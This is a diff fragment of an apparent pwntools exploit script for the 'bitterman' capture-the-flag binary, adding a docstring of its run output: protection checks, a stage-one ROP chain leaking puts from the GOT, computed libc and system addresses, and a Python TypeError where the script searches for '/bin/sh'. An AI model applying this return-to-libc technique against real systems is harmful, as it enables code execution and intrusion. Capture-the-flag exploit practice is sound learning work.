@@ -93,3 +93,36 @@ io.sendline("1024")
 io.recvuntil("text:")
 io.sendline(payload2)
 io.interactive()
+'''
+# ./bitterman-300_rop_libcputs_pwnlib.py LOCAL DEBUG
+[*] Mapping binaries
+[*] '/opt/bitterman-300/bitterman'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/lib/x86_64-linux-gnu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process '/opt/bitterman-300/bitterman': pid 2284
+[*] Loaded cached gadgets for './bitterman'
+[*] Stage 1 ROP Chain:
+    0x0000:         0x400853 pop rdi; ret
+    0x0008:         0x600c50 [arg0] rdi = got.puts
+    0x0010:         0x40051c
+    0x0018:         0x4006ec 0x4006ec()
+[*] Leaked puts@GOT: 0x7f02d92ca040
+[*] PUTS@GLIBC: 0x7f02d92ca040
+[*] @GLIBC offset: 0x7f02d9256000
+[*] system@GLIBC: 0x7f02d929cff0
+Traceback (most recent call last):
+  File "./bitterman-300_rop_libcputs_pwnlib.py", line 81, in <module>
+    binsh = next(libc.search("/bin/sh"))
+  File "/usr/local/lib/python3.7/dist-packages/pwnlib/elf/elf.py", line 1097, in search
+    offset = data.find(needle, offset)
+TypeError: argument should be integer or bytes-like object, not 'str'
+'''
